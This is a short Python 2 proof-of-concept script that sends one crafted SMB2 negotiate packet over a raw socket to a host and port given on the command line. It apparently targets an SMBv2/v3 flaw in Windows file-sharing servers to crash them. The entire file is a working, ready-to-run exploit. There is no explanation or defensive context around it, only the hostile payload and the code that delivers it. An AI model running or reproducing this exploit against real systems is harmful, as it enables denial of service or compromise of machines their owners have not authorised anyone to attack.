#!/usr/bin/env python
import sys
import socket


def vul_smb_2(host, port=445):
    payload = '\x00\x00\x00\xee\xfeSMB@\x00\x01\x00\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xd1\xc5\x81\xc2\xec\x88\xea\x11\x83\xce4\x17\xeb\xc5\x0c{p\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\xf3\xa0\x80\xa5\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00\xf3\xa0\x81\x8b&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\xd4\xfa\xbc\xe0\xb9\x83^\xc5g\x8a9\xeaP\xe6\xa0(\x13\xc7\xa9\xa9@\xf40\x0f\xc3\xe3\x98\x89\xc54\x1e\xb46h\xea\x00\x00\x02\x00\x06\x00\x00\x00\x00\x00\x02\x00\x02\x00\x01\x00\x00\x00\x03\x00\x0e\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\xe2\x02\x00\x01\x00\x00\x00\x03\x00\x0e\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\xe2\x80\x81\x00\x00\x00\xf3\xa0\x81\xa4\x05\x00\x1e\x00\x00\x00\x00\x001\x009\x002\x00.\x001\x006\x008\x00.\x002\x000\x000\x00.\x0032770\x005\x0032767\x00'

    send_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    send_socket.connect((host, port))
    send_socket.send(payload)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "Usage: python poc.py <ip> <port>"
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])
    vul_smb_2(host, port)
